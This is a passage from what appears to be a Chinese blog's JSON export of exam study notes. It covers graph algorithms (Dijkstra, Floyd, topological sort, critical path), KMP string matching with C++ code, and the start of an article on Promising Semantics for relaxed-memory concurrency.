Prim，也是把当前结点分成已经选择的和未被选择的。每次选择一个结点后，不同于 Prim 那样把该结点连出去的结点到该节点的边权作为后续选择的依据，而是将连出去的结点到原点的距离作为后续选择的依据。\r\n\r\nPrim 相当于每次选择权值最小的边，将其连接到已经构建的生成树上。而 Dijkstra 是每次找到离源点距离最近的点接入到已经构建的最短路树上，同时以这个点为基础再去更新源点到其他顶点的距离。\r\n\r\n在 408 中认为 Dijkstra 默认是没有堆优化的，所以时间复杂度是 $O(|V|^2)$ 的（对于邻接矩阵表示是这样，对于邻接表表示也是这样（因为要选取离源点距离最近的点，这个过程占大头））\r\n\r\nDijkstra 不适用于含有负权的图。\r\n\r\n#### 4.2.2 Floyd\r\n\r\nFloyd 的最外层循环相当于是一个不断迭代的过程，每迭代一次，就从最短路径上多考虑了一个点，经过 $n$ 次迭代就可以得出最短路。\r\n\r\n我们称 $path_k$ 表示已经考虑了前 $k$ 个点之后的最短路径。那么有 $path_{k-1}$ 路径上的点一定是 $path_{k}$ 路径上的点的子集。\r\n\r\n跑完 Floyd 算法之后，我们可以对每个点 $i$，判断点 $i$ 到点 $i$ 之间的最短距离是否为 $0$，如果 $<0$ 的话说明存在负环。\r\n\r\nFloyd 算法的时间复杂度为 $O(|V|^3)$。\r\n\r\n### 4.3 有向无环图\r\n\r\n#### 4.3.1 拓扑排序\r\n\r\n**AOV网**：在有向无环图中，整个图表示一个工程，顶点表示一个活动，并且每个边没有权值，仅表示活动之间先后的依赖关系。这种有向无环图被称为 AOV 网。\r\n\r\n**拓扑排序**：指的是一个有向无环图顶点组成的序列，其满足：\r\n\r\n- 每个顶点出现且仅出现一次\r\n- 如果顶点 $A$ 排在顶点 $B$ 前面，那么不存在从 $B$ 到 $A$ 的路径。\r\n\r\n使用邻接表存储时，拓扑排序的时间复杂度为 $O(|V|+|E|)$。使用邻接矩阵存储时，拓扑排序的时间复杂度为 $O(|V|^2)$。\r\n\r\n求拓扑排序有两种方法：\r\n\r\n- 第一种基于 BFS，即每次选择当前入度为 $0$ 的点，然后把这个点连出去的边去掉，更新其他点的入度，然后再继续选择。如果改为每次选择出度为 $0$ 的点，那么得到的序列叫做**逆拓扑排序**。\r\n- 第二种基于 DFS，即对入度为 $0$ 的点进行 DFS，在回溯时，把当前遍历到的点输出。这样的到的是逆拓扑排序。\r\n\r\n对于一个图来说，如果其邻接矩阵是一个三角矩阵，那么就存在拓扑排序。但是反之不一定成立，比如：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/30/image-20251230231206130.png)\r\n\r\n如果这里没有说是“有序”的拓扑排序序列，那么邻接矩阵就会使一般的了，需要重新编号才能使得其邻接矩阵变为三角矩阵。\r\n\r\n#### 4.3.2 关键路径\r\n\r\n**AOE网**：在有向无环图中，每个顶点一个事件，每个有向边表示一个活动，并且有向边有权值，表示完成这个活动所需要的时间。这种有向无环图被称为 AOE 网。在 AOE 网中，仅有一个入度为 $0$ 的点，被称为**开始顶点/源点**，仅有一个出度为 $0$ 的点，表示**结束顶点/汇点**。\r\n\r\nAOE 网用边表示活动，AOV 网用顶点表示活动。\r\n\r\n**关键路径**：从源点到汇点的所有路径中，具有最大路径长度的路径称为**关键路径**，关键路径上的活动称为**关键活动**。\r\n\r\n**事件最早发生时间**\r\n\r\n对于事件 $v_k$，其最早发生时间是指从源点 $v_1$ 到顶点 $v_k$ 的最长路径长度，表示为 $v_e(k)$。\r\n\r\n可以在拓扑排序的基础上计算 $v_e$ 的值。初始时有 $v_e(i) = 0$（$i = 1\\dots n$）。然后每次遍历到一个入度为 $0$ 的点 $v_j$ 时，对于其后继顶点 $v_k$，令 $v_e(k) = \\min(v_e(j) + Weight(v_j, v_k), v_e(k))$。\r\n\r\n**事件最迟发生时间**\r\n\r\n对于事件 $v_k$，其最迟发生时间表示该事件最多可以延后进行且不会影响整个工程完成的时间，表示为 $v_l(k)$。\r\n\r\n可以在逆拓扑排序的基础上计算。初始时有 $v_l(i) = v_e(n)$（$i = 1\\dots n$）。对于遍历到的每一个出度为 $0$ 的点 $v_j$，对于其前驱结点 $v_k$，令 $v_l(k) = v_l(j) - Weight(v_k, v_j)$。\r\n\r\n**活动最早开始时间**\r\n\r\n如果边 $\\left<v_k, v_j\\right>$ 表示活动 $a_i$，则 $e(i)$ 表示其最早开始时间，且 $e(i) = v_e(k)$。\r\n\r\n**活动最迟开始时间**\r\n\r\n如果边 $\\left<v_k, v_j\\right>$ 表示活动 $a_i$，则 $l(i)$ 表示其最晚开始时间，且 $l(i) = v_l(j) - Weight(v_k, v_j)$。\r\n\r\n**活动的时间容量**\r\n\r\n表示在不增加完成整个工程所需总时间的情况下，活动可以拖延的时间。对于活动 $a_i$，其时间容量为 $l(i) - e(i)$。\r\n\r\n如果一个活动的时间容量为 $0$，那么这个活动就是一个关键活动。\r\n\r\n由于求关键路径的过程中使用了拓扑排序，因此求关键路径也可以算作判环的方法。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/30/image-20251230230246546.png)\r\n\r\n#### 4.3.3 公共子式\r\n\r\n可以用有向无环图来描述含有公共子式的表达式。比如：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/31/image-20251231152253184.png)\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/31/image-20251231152315667.png)\r\n\r\n在表达式的有向无环图表示中，不可能出现重复的操作数顶点。\r\n\r\n## 5. 做题\r\n\r\n### 5.1 归类\r\n\r\n如果一个无向图有 $n$ 个点：\r\n\r\n- 若边数小于 $n-1$，则图必然是非连通图。\r\n- 如果是非连通图，则最多有 $\\frac{(n-1)(n-2)}{2}$ 边。（$n-1$ 个点构成完全图，然后另一个点孤立）（$n$ 个点的图，如果有 $\\frac{(n-1)(n-2)}{2} + 1$ 条边，那么必然是连通的）（如果问给定边数的图非连通的话，最少有多少个点，也是按这种方法求）\r\n\r\n如果一个有向图有 $n$ 个点：\r\n\r\n- 在强连通的条件下最少有 $n$ 条边，构成一个环路\r\n\r\n### 5.2 错题\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/24/image-20251224202635065.png)\r\n\r\n在邻接表上遍历所有边的时候，还会遍历所有点\r\n\r\n- （X）若有向图不存在回路，即使不使用访问标志位，同一结点也不会被访问两次\r\n\r\n一个反例：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/26/image-20251226220418570.png)\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/30/image-20251230225031288.png)\r\n\r\nA：如果不是简单路径的话，那么路径上就会存在相同的点，那么就说明从一个点出发然后再回来，路径长度反而缩短了，这意味着出现了负环，而在存在负环的图上最短路径是没有定义的。\r\n\r\nD：对于路径，如果我们说路径 $p_1$ 是路径 $p_2$ 的子集，并不意味着 $p_1$ 上的点的集合是 $p_2$ 上的点的集合的子集，而是意味着 $p_1$ 是 $p_2$ 的前缀。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/30/image-20251230230038576.png)\r\n\r\nⅡ：注意是对每对顶点都求最短路\r\n\r\nⅢ：这里的含有负边的回路指的是最小环\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/30/image-20251230230456332.png)\r\n\r\n对于Ⅲ的一个反例：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/30/image-20251230230543321.png)\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/30/image-20251230230936122.png)\r\n\r\n仅含有一个点的图（且边集为空）也应该被视为是一个强连通图，在这上面应该是可以进行拓扑排序的。但是这道题却没考虑这一点。这似乎存在争议。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/30/image-20251230231657742.png)\r\n\r\nⅢ：有可能较小边权两端点已经被选择，于是可能出现某条边的权值超过未选边的权值\r\n\r\nⅣ：一个反例如下：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/30/image-20251230231622697.png)\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/30/image-20251230232403708.png)\r\n\r\n2）由于一个点也可以视为一个强连通分量，因此有 $7$ 个\r\n\n","summary":"本文介绍了图的基本概念、存储方式、遍历算法及其应用，包括最小生成树、最短路径、拓扑排序和关键路径等核心内容。","key":["408","考研","数据结构","图论"],"tags":[],"path":["考研","数据结构","408数据结构-图论.md"],"background":"https://api.file.caiwen.work/picture/2026/01/01/20260101191515335.png","recommend":false,"status":"published"},{"type":"Article","title":"408数据结构-字符串","id":"408-string","createTime":"2025-12-23T11:44:00.000Z","updateTime":"2026-01-01T11:13:31.647Z","content":"\r\n## 1. 一些定义\r\n\r\n- 串中任意多个连续的字符串组成的子序列称为该串的**子串**，包含子串的串称为**主串**\r\n\r\n- 子串在主串中的位置以**子串的第 1 个字符**在主串中的位置来表示（以 1 开始）\r\n- 由一个或者多个空格组成的串称为**空格串**，空格串不是空串\r\n\r\n## 2. 串的模式匹配\r\n\r\n### 2.1 简单匹配\r\n\r\n就是直接暴力匹配，$O(nm)$\r\n\r\n匹配成功则返回子串在主串中的位置，匹配失败则返回 $0$。\r\n\r\n### 2.2 KMP\r\n\r\nKMP算法利用了之前已经匹配的部分的最长公共前后缀，使得主串的指针不会减少，时间复杂度 $O(m+n)$\r\n\r\n![失配时利用已经匹配部分的最长前后缀，将模式串向右平移，保持了子串前面部分依然和主串匹配。主串的指针得以不变](https://api.file.caiwen.work/picture/2025/12/23/image-20251223195307097.png)\r\n\r\n#### 2.2.1 Next 数组\r\n\r\n$Next_i$ 表示当模式串在 $i$ 这个位置失配之后，主串的指针保持不变，继续让主串尝试和 $Next_i$ 这个位置匹配。（$Next$ 数组的处理使得 $[1,Next_i-1]$ 部分仍然和主串是匹配上的。\r\n\r\n**手动计算做法**\r\n\r\n首先 $Next_1=0$，$0$ 表示一个特判，如果匹配的时候跳 $Next$ 数组发现跳到 $0$ 的时候，表示主串当前位置已经无法继续匹配了，主串指针需要往前走一位，然后再重新与模式串从头匹配。\r\n\r\n对于其他位置，比如我们要求 $Next_i$，则先考虑模式串上，$i$ 之前的部分（即 $[1,i-1]$）的最长公共前后缀（不包含 $[1,i-1]$ 本身）的长度 $len$，于是 $Next_i = len + 1$。\r\n\r\n**代码实现**\r\n\r\n上面的做法只是人类比较能直观理解的，如果用代码实现的话，需要用递推的方式来确保时间复杂度。\r\n\r\n首先还是 $Next_1 = 0$。\r\n\r\n然后对于 $Next_{i+1}$，相当于我们在考虑 $[1,i]$ 的最长公共前后缀长度，那么假设我们已经知道了 $[1, i-1]$ 的最长公共前后缀长度，比如说是 $len$，那么我们只需要判断一下 $len+1$ 和 $i$ 这两个位置字符是否相等，如果也一样的话，那么 $[1,i]$ 的最长公共前后缀长度就是 $len+1$ 了。按 $Next$ 的表示，就是判断一下 $i$ 和 $Next_i$ 是否相等，相等的话 $Next_{i+1} = Next_i + 1$。\r\n\r\n如果不一样，那么我们可以再去看 $[1, len]$ 的最长公共前后缀长度，比如说是 $len'$，那么 $[1,len']$ 和 $[len-len'+1，len]$ 相同，由由于 $[1,len]$ 和 $[(i-1)-len+1, (i-1)]$ 是一样的，所以 $[1,len']$ 和 $[(i-1)-len'+1,(i-1)]$ 是一样的，因此可以继续判断 $len'+1$ 和 $i$ 是否一样，以此来推 $[1,i]$ 的最长公共前后缀长度。按$Next$ 的表示，就是判断 $Next_{len+1} = Next_{Next_i}$ 是否和 $i$ 是相等的，相等的话 $Next_{i+1} = Next_{Next_i} + 1$。\r\n\r\n上面这个过程是一个递归过程，我们可以一直这样套下去。\r\n\r\n```c++\r\nvoid get_next(SString T, int next[]) {\r\n    int i = 1, j = 0; // 这里的 j 存的是 next[i]\r\n    next[1] = 0;\r\n    while (i < T.length) {\r\n        if (j == 0 || T.ch[i] == T.ch[j]) { // 跳 next 跳不动了，或者是字符串相等了\r\n            ++i; ++j; // 我们是从 i 推到 i + 1。同时也完成了 next + 1\r\n            next[i] = j;\r\n        } else j = next[j]; // 继续跳 next 数组\r\n    }\r\n}\r\n```\r\n\r\n匹配就比较简单了：\r\n\r\n```c++\r\nint Index_KMP(SString S, SString T, int next[]) {\r\n    int i = 1, j = 1; // i 表示在主串中将要匹配的位置，j 表示在模式串中将要匹配的位置\r\n    while (i <= S.length && j <= T.length) {\r\n        if (j == 0 || S.ch[i] == T.ch[j]) {\r\n            ++i; ++j;\r\n        } else j = next[j];\r\n    }\r\n    if (j > T.length) return i - T.length;\r\n    return 0;\r\n}\r\n```\r\n\r\n#### 2.2.2 Nextval\r\n\r\n上面的算法还有一点缺陷，比如：\r\n\r\n![进一步优化示例](https://api.file.caiwen.work/picture/2025/12/23/image-20251223203558905.png)\r\n\r\n当阴影部分失配的时候，模式串只会一点一点地往右移，并且都会出现失配。\r\n\r\n这是因为，如果主串 $i$ 位置和模式串 $j$ 位置发生失配时，$i$ 会继续与 $Next_j$ 匹配，但是 $P_j = P_{Next_j}$ 的话，那么显然这个匹配是不成立的，还需要继续跳 $Next$ 数组。\r\n\r\n优化方式是类似并查集那样\"路径压缩\"：\r\n\r\n```c++\r\nvoid get_nextval(SString T, int nextval[]) {\r\n    int i = 1, j = 0;\r\n    nextval[1] = 0;\r\n    while (i < T.length) {\r\n        if (j == 0 || T.ch[i] == T.ch[j]) {\r\n            ++i; ++j;\r\n            // 下面不太一样\r\n            // 如果不等的话，就和前面一样\r\n            if (T.ch[i] != T.ch[j]) nextval[i] = j;\r\n            // 相等的话需要再往前跳一下\r\n            else nextval[i] = nextval[j];\r\n        } else j = nextval[j];\r\n    }\r\n}\r\n```\r\n\r\n这样计算将会得到 $Nextval$ 数组。\r\n\r\n### 2.3 其他\r\n\r\n需要注意的是，上面说的 $Next$ 数组是基于字符串下标从 $1$ 开始这个前提的。如果从 $0$ 开始的话，上面求出来的值都要减一。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/23/image-20251223204658721.png)\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/23/image-20251223204811065.png)\r\n\r\n上面这个题比较坑的是，$i = j = 5$ 这个位置失配，隐含了字符串下标是从 $0$ 开始的这个条件（如果从 $1$ 开始的话失配就不成立了）\r\n\n","summary":"本文介绍了串的基本定义和模式匹配算法，重点讲解了KMP算法及其Next数组的构建与优化，包括Nextval数组的改进方法。","key":["408","考研","数据结构","字符串","kmp"],"tags":[],"path":["考研","数据结构","408数据结构-字符串.md"],"background":"https://api.file.caiwen.work/picture/2026/01/01/20260101191308783.png","recommend":false,"status":"published"},{"type":"Article","title":"Promising Semantics","id":"promising-semantics","createTime":"2025-12-21T05:08:00.000Z","updateTime":"2025-12-21T05:10:29.756Z","content":"\r\nPromising Semantics 是对于宽松内存模型的一种解释模型，具体的简介和论文在这里：[A Promising Semantics for Relaxed-Memory Concurrency](https://sf.snu.ac.kr/promise-concurrency/) 。\r\n\r\n## 1. 基本概念\r\n\r\n### 1.1 Multi-valued Memory\r\n\r\n在 Promising Semantics 中，内存中的一个位置上不只是有一个值，而且有多个。每次在对某个位置上写入数据时，应该将其视为在该位置插入了一个“消息”。每个消息都有一个时间戳，表示其什么时候被插入的。\r\n\r\n比如下面这个例子，其中 `X` 和 `Y` 是内存地址，`r1` 和 `r2` 是寄存器。内存中的数据初始情况下均为 0。后面的例子没有特殊说明也是按这个来。\r\n\r\n```\r\nX = 1   ||  Y = 1\r\nr1 = Y  ||  r2 = X\r\n```\r\n\r\n这个例子中可能会发生 **Load hoisting**，即 load 操作被提前，具体原因可以参考：[软件性能工程-多核编程 - Caiwen的博客](https://www.caiwen.work/post/mit6172-4#3-5-nei-cun-mo-xing)，那么就存在 `r1 = r2 = 0` 的情况。 使用 Promising Semantics 解释的话就是两个线程可能写内存相当于是从对应的内存位置插入数据，而并非是覆盖数据：\r\n\r\n![image-20251219153759017](https://api.file.caiwen.work/picture/2025/12/19/image-20251219153759017.png)\r\n\r\n而在读内存的时候，不一定要选择时间戳最新的消息的数据来读，也可以读旧的数据，于是 `r1 = r2 = 0` 就是有可能的。\r\n\r\n### 1.2 View\r\n\r\n每个线程都有一个 View，表示在一个位置上已经接受了哪个消息，当读和写的时候就会更新 View。比如还是上面那个例子，当左边线程执行 `X = 1` 后，其 View 就变成了下面这样：\r\n\r\n![image-20251219160338915](https://api.file.caiwen.work/picture/2025/12/19/image-20251219160338915.png)\r\n\r\n读和写操作只能作用在 View 的右边：\r\n\r\n![image-20251219160603820](https://api.file.caiwen.work/picture/2025/12/19/image-20251219160603820.png)\r\n\r\nView 的设计可以使得 **per-location coherence** 原则得到保证，这个原则表明，对于同一个内存位置的操作顺序是所有线程公认一致的，具体来说可以分为以下四点：\r\n\r\n- Read-Read Coherence：如果在同一个线程中读 `x` 得到了某个值，那么该线程第二次读的时候不能读取到比第一次读取更旧的值。\r\n- Write-Read Coherence：如果在一个线程中，先写入了 `x`，然后再读 `x` 的时候，要么读取到刚才写入的值，要么读取到在全局顺序中比刚才写入的值更新的值。\r\n\r\n（上面两个更倾向于是单线程内的程序顺序的感知）\r\n\r\n- Write-Write Coherence：如果两个线程同时对 `x` 进行修改。如果线程一看到的是先进行了 `x=1` ，然后进行 `x=2`，那么线程二看到的也将会是先 `x=1` 再 `x=2`。\r\n- Read-Write Coherence：如果在一个线程中，先读取了 `x`（得到旧值），然后写入了 `x`（写入新值），那么在其他的线程中就不应该出现先读到了旧值再读到了新值的情况。即所有线程都应该承认先读后写这个相对顺序。\r\n\r\n（上面两个更倾向于是要求线程之间达成一个全局顺序的共识）\r\n\r\n比如：\r\n\r\n```\r\nx = 1   ||  x = 2\r\na = x   ||  b = x\r\n```\r\n\r\n假如 `a` 读到 2，那么说明在时间轴上是先写入 1 再写入 2 的（不然的话线程 1 写入 1 之后，其 View 的右边就没有写入 2 的消息了），而这样的话，线程二写入 2 之后，其 View 的右边就不会有写入 1 的消息了，因此不可能出现 `a = 2`，`b = 1` 的情况。\r\n\r\n同时这里再对 Multi-valued Memory 进行补充。一个线程在往内存位置中插入写数据的消息时，时间戳可以随便选，只要严格大于当前视图的时间戳就可以，比如：\r\n\r\n```\r\nx = 2  ||  y = 2\r\ny = 1  ||  x = 1\r\na = y  ||  b = x\r\n```\r\n\r\n可以出现 `a = b = 2` 的情况，我们只需要让写 1 时取的时间戳小于写 2 时取的时间戳就可以了。\r\n\r\n### 1.3 Promise\r\n\r\n比如：\r\n\r\n```\r\nr1 = X  ||  r2 = Y\r\nY = r1  ||  X = 1\r\n```\r\n\r\n可能会出现 **Store Hoisting**，即右边的线程将 `X = 1` 提前，毕竟单看右边的线程，`X = 1` 这个操作没什么依赖，放在什么时候执行都无所谓，所以就不如提到最前面执行。这就导致 `r1 = r2 = 1` 是可能发生的。\r\n\r\n为了解释这个问题，Promising Semantic 允许一个线程先 promise 自己会写入某个数据：\r\n\r\n![image-20251219171311040](https://api.file.caiwen.work/picture/2025/12/19/image-20251219171311040.png)\r\n\r\n然后我们需要对这个 promise 进行 certificate，即不看其他的线程，只看发起 promise 的线程，能否仅靠自己就可以兑现这个 promise，如果可以的话这个 promise 就是 certified 的。\r\n\r\n此时对于其他线程来说，就相当于是 `X` 这个位置写入了 1，后续可以直接去使用这个位置。\r\n\r\n![r1 读到了 1](https://api.file.caiwen.work/picture/2025/12/19/image-20251219171758472.png)\r\n\r\n![Y 写入了 1](https://api.file.caiwen.work/picture/2025/12/19/image-20251219171833770.png)\r\n\r\n注意，一个 promise 能够成立，还需要完成 re-certificate 的操作，即确保这个线程真的能兑现承诺：\r\n\r\n![r2 读取 Y](https://api.file.caiwen.work/picture/2025/12/19/image-20251219171954495.png)\r\n\r\n![右边的线程兑现了承诺](https://api.file.caiwen.work/picture/2025/12/19/image-20251219172036341.png)\r\n\r\n又比如：\r\n\r\n```\r\nr1 = X  ||  r2 = Y\r\nY = r1  ||  X = r2\r\n```\r\n\r\n在 Promising Semantics 中是不可能出现 `r1 = r2 = 1` 的（但在 C++ 以前的内存模型中可能会允许这样的情况（只是模型能允许，但实际上也产生不了），也就是经典的 **Out of thin air**）。因为如果要产生这种情况，需要右边的线程先 promise `X = 1`，但是我们再进行 certificated 的时候，发现仅凭右边的线程是无法兑现这个 promise 的，因此这个 promise 就不成立。\r\n\r\n又比如：\r\n\r\n```\r\nr1 = X  ||  r2 = Y\r\nY = r1  ||  if r2 == 1 { X = r2 } else { X = 1 }\r\n```\r\n\r\n如果仅仅是依赖于硬件的话，上面的情况可能并不会出现 store hoisting。但是编译器的优化会将这个分支判断优化成 `X = 1`，然后再进行 store hoisting。我们的 Promising Semantics 也能解释这一点：右边的线程 promise `X = 1`，并且右边的线程能够独自兑现 promise（certified），并且实际运行中右边线程也确实兑现了 promise （re-certified）\r\n\r\n对于发起 promise 的线程，往往不能在 promise re-certified 之前利用这个 promise，比如：\r\n\r\n```\r\na = X\r\nX = 1\r\n```\r\n\r\n是不能出现的 `a = 1` 的。Promising Semantics 的 View 对其进行限制。promising `X = 1` 之后，`a` 如果读到 1 的话，那么 View 就会被拉到这个 `X = 1` 这里。此时再进行 `X = 1`，消息就只能插到当前 View 的左侧（且是严格的左侧，插入消息不能直接插到当前 View 的位置），于是就无法兑现这个 promise 了。\r\n\r\n发起 promising 可能会对程序后续的运行做出更多限制，比如：\r\n\r\n```\r\na = X  ||  X = 2\r\nX = 1  ||\r\n```\r\n\r\n左边线程可以发起一个 promise，并且这个 promise 也是可以被 certified 的（只要前面 `a = X` 没有读到 1 就可以）。但是，如果右边线程插入了 `X = 2` 这个消息，且时间戳比左边线程的 promise 还大，并且左边线程的 `a = X` 读到 2 了，那么就会使得左边线程的 View 跨过了 promise，使得这个 promise 无法被 re-certified，于是这种情况是不被允许的。\r\n\r\n（需要注意的是，这里所说的限制，限制的是发起 promise 的线程。对于上面所说的情况来说，左边线程的 `a = X` 读到 2 是不被允许的，但是右边线程将 `X = 2` 的时间戳取得比 promise 还大，这个是允许的）\r\n\r\n同时还可以再对 Multi-valued Memory 做一个补充：时间戳不一定需要是一个整数，也就是两个整数的时间戳之间还能再插入时间戳。比如：\r\n\r\n```\r\nx = 1  ||  x = 3\r\nx = 2  ||\r\n```\r\n\r\n左边线程可能会在时间 2 promise `x = 2`。右边线程的 `x = 3` 可能发生在时间 1。为了使得 promise 能够被兑现，左边线程的 `x = 1` 的时间戳需要比 2 小，但是 1 和 0 都已经被占用了。好在 Promising Semantics 允许时间戳是任意数字，我们可以让 `x = 1` 发生于时间 1.5。\r\n\r\n发起 promise 时，时间戳可以任取。\r\n\r\n写操作可以看作是先发起了一个 promise，然后又立刻兑现他。\r\n\r\n## 2. Atomic Update\r\n\r\n这里所说的原子操作是形如 fetch and add 和 compare and swap 这种 read and modify 的。\r\n\r\n```\r\nr1 = X.fetch_add(1) || r2 = X.fetch_add(1)\r\n```\r\n\r\n这里的 `fetch_add` 将会返回 `X` 原来的值。上面这个例子中，理论上来说是不能出现 `r1 = r2 = 0` 的情况的，因为 `fetch_add` 是原子操作，不能 interleave。`fetch_add` 也算是一种写内存，如果直接将其视为普通的写操作的话，那么就可能会出现两个线程都读 `X = 0` 并且都写入 `X = 1`。\r\n\r\nPromising Semantics 将这种原子操作看成是一个时间戳的区间：\r\n\r\n![image-20251219190604281](https://api.file.caiwen.work/picture/2025/12/19/image-20251219190604281.png)\r\n\r\n这个区间是左开右闭的，左端点是 read 的数据的时间戳，右端点是 modify 作用的时间戳。Promising Semantics 规定一个内存位置的消息之间的时间戳是没有交集的，所以只能基于同一个消息做一次原子操作。\r\n\r\n但是原子操作占用一个区间，这可能导致之前的 promise 无法兑现：\r\n\r\n```\r\na = x\t\t\t\t|| x = y || z.fetch_add(1)\r\nb = z.fetch_add(1)  ||\t\t ||\r\ny = b + 1\t\t\t||\t\t ||\r\n```\r\n\r\n比如这个例子中，线程 1 首先 promise `y = 1`，但这个是基于 `b = z.fetch_add(1)` 先于 `z.fetch_add(1)` 执行的情况，而如果后者先执行，那么这个 promise 就兑现不了了。\r\n\r\n于是 Promising Semantics 对 promise 做了如下限制：对 promise 进行 certificate 的时候，还需要确保，这个 promise 在未来的任何内存情况下都是能兑现的。\r\n\r\n一个思考是这里为什么不去限制后续的原子操作不能使得 promise 无法兑现？这是因为 Promising Semantics 有线程局部性的原则，就是让一个线程操作带来的限制尽可能的是限制线程本身。这里一个相似的地方是，上文也提到过一个发起一个 promise 可能会对程序后续操作做出限制，当时那里的限制也是限制发起 promise 的操作本身的。\r\n\r\n不过即使在这个限制下，我们也可以这么做：在 $(0, 1]$ 这个时间上 promise `z = 1` （即 promise 线程 1 的 `z.fetch_add(1)` 先于线程 3 的执行）（这个 promise 一定可以兑现，因为这个时间段上不可能再有其他操作了），然后再在 $(3,4]$ 这个时间上 promise `y = 1`（也是一定可以兑现的，毕竟 `b` 的值已经被前面那个 promise 确定了）\r\n\r\n## 3. 同步\r\n\r\n### 3.1 Release / Acquire Fence\r\n\r\n有时候我们需要阻止指令重排，以确保程序的正确性，这就需要用到一些 ordering primitives：\r\n\r\n- sc fence：sc fence 两侧的指令不能重排，或者说下面的指令不能到上面，上面的指令也不能到下面，是一种双向的限制\r\n- release fence：让上面的指令不能到下面去。一般用于 store（比如对标志位的修改，这样可以确保标志位的修改不会提前）\r\n- acquire fence：让下面的指令不能到上面去。一般用于 load（比如循环判断标志位是否修改，这样可以确保标志位确实修改之后再进行其他操作，不会让其他操作的指令移上来）\r\n\r\n我们先来讨论 release fence 和 acquire fence。此时 Promising Semantics 需要进行进一步扩展。现在，每个线程有多个 view，一个 cur view，一个 rel view，一个 acquire view。cur view 相当于没扩展之前线程的 view，rel view 表示当前线程在上次进行 release fence 操作时的 cur view，acq view 表示当前线程如果进行一个 acquire fence 操作将会合并进来的 view。一般来说有 $\\text{rel view} \\le \\text{cur view} \\le \\text{acq view}$。\r\n\r\n如果不加特殊说明，我们后面说“合并” view 指的是原 view 和要被合并进来的 view 在时间轴上取 max。\r\n\r\n除此之外，我们还对于每个消息引入了 message view 。一个消息的 message view 为发布这个消息时，当前线程的 rel view。\r\n\r\n这几个 view 之间是这样运作的。当线程执行 release fence 时，会将线程的 rel view 变为 cur view。当前线程发布一个消息（即写）的时候，消息的 message view 即为当前线程的 rel view。当前线程收到一个消息（即读）的时候，会将消息的 message view 合入到当前线程的 acq view 中。当线程执行 acquire fence 时，会将线程的 acq view 合入到 cur view 中。\r\n\r\n![image-20251220221347069](https://api.file.caiwen.work/picture/2025/12/20/image-20251220221347069.png)\r\n\r\n上面例子中，fence-rel 操作会将左边线程的 rel view 更新为其 cur view，于是 x = 1 就存在于 rel view 中，然后再产生 y = 1 这个消息时，就携带了这个 rel view。然后右边线程如果读到 y = 1，就说明其接收到了 y = 1 这个消息，同时将其 message view 合入 acq view 中，那么 acq view 就包含了 x = 1，后面再进行 fence-acq 操作，就会使得右边线程的 acq view 合入 cur view，那么其 cur view 就包含了 x = 1 ，于是后面必然会读到 x = 1。\r\n\r\n注意的是，一般来说 release fence 后面的 store 是不能 promise 在 release fence 之前的，就比如上面这个例子中，y = 1 是不能在程序最开始 promise 的。这是因为 promise 和普通的写操作差不多，也会携带 message view。当我们在程序最开始 promise 的时候，此时这个 promise 的 message view 其实是一个初始状态的 view（即每一个内存位置都是到 0 这个时间戳）。而我们的 release fence 是想让其后面的 store 指令的 message view 带上当前 rel view，那么这个目的就达不到了。\r\n\r\n还有一点，acquire fence 后面的 store 操作却能够跨过 acquire fence 进行 promise。因为 acquire fence 是来将 load 操作接收到的 message view 合入 cur view 的，和 store 操作无关。\r\n\r\n不过这里我也不太能理解清楚。特别是 acquire fence 如果允许后面的 store 操作进行 promise 从而前移的话，似乎违背了我们之前所说的 acquire fence 不能让下面的指令移动到上面去。我自己的理解是，acquire fence 只是确保 fence 下面的 load 指令会同步，而对于 store 指令无所谓。\r\n\r\n### 3.2 Release / Acquire Access\r\n\r\n一般是 store 对应于 release，load 对应于 acquire 。release store 可以等价于先进行一个 release fence，然后再进行一个 relaxed store。acquire load 可以等价于先进行一个 relaxed load，再进行一个 acquire fence。\r\n\r\n但 release access 还有点特殊，此时我们的 Promising Semantics 还需要再扩展一下：每个线程不再是只有一个 rel view 了，而是每个线程中，每个位置都有一个 rel view。在进行任何的 store 操作时（无论是 release、acquire 还是 relaxed），被 store 的位置的 rel view 就会更新。在进行 release store 的时候，就会把该位置的 rel view 变为当前线程的 cur view。release store 发出的消息携带的 message view 也只会携带其对应位置的 rel view。\r\n\r\n其实另一个角度说 release fence 反而是一种特例，他会把所有位置的 rel view 都同步到 cur view。\r\n\r\n![image-20251220231843769](https://api.file.caiwen.work/picture/2025/12/20/image-20251220231843769.png)\r\n\r\n比如上面这个例子，线程 2 收到 y = 1 的话，其 message view 也包含了 x = 1，那么再 acquire 之后，b 就一定会是读到 1。而线程 3 收到 z = 1，但线程 1 发出 z = 1 的时候仅仅是携带了 z 位置的 rel view，而这个位置由于没有 release 同步到 cur，所以是还没有包含 x = 1，那么线程 3 很有可能就会读到 x = 0。\r\n\r\n和 release / acquire fence 中提到到的一样，release access 往往不能 promise，而 acquire access 能够 promise。\r\n\r\n![release access 不能 promise，acquire access 能够 promise](https://api.file.caiwen.work/picture/2025/12/21/image-20251221105331424.png)\r\n\r\n![acquire access 能够 promise](https://api.file.caiwen.work/picture/2025/12/21/image-20251221105401005.png)\r\n\r\n### 3.3 Release Sequences\r\n\r\n对于 read and modify 这个 atomic update，其具体来说是分为了 read 和 write 两个行为，于是这个 atomic update 也会在内存中产生一个消息。Promising Semantics 中规定，atomic update 的 message view 必须将其 read 行为得到的 message view 也给合并进来，这样就会导致一个“消息链条”。\r\n\r\n![image-20251221104512897](https://api.file.caiwen.work/picture/2025/12/21/image-20251221104512897.png)\r\n\r\n比如上面这个例子，$y_{\\mathbf{rel}} = 1$ 会将 $x = 1$ 合入到 y 位置处的 rel view。那么后面的 $y = 2$ 的 message view 中也会携带了 $x = 1$。如果线程三读到了 $y = 3$，那么说明之前线程 2 先基于线程 1 